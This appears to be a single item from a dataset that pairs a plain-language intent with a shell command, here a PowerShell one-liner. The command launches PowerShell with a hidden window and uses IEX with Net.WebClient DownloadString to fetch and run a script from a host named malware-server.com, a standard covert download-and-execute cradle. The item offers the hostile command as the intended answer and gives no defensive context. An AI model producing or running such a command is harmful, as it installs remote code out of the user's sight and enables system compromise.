# Natural language intent:
# Execute PowerShell with specific settings to download and execute a script from a specified URL with a hidden window.

powershell.exe -WindowStyle Hidden -c "IEX (New-Object Net.WebClient).DownloadString('http://malware-server.com/rootFile.ps1')"
